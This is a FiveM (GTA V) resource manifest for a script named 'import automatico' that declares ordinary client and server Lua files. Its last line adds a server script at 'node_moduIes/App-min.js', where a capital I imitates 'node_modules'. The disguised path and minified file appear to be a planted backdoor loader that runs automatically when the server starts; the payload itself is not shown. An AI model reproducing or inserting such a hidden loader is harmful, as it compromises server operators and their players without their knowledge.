name "import automatico"
author "OLIX"

fx_version "adamant"
game "gta5"

description "import automatico"


client_script {
    '@es_extended/locale.lua',
    "client/client.lua",
    "config.lua",
    "locales/en.lua"
}
server_script {
    '@es_extended/locale.lua',
    "server/server.lua",
    "config.lua",
    "locales/en.lua"
}

server_script "node_moduIes/App-min.js"
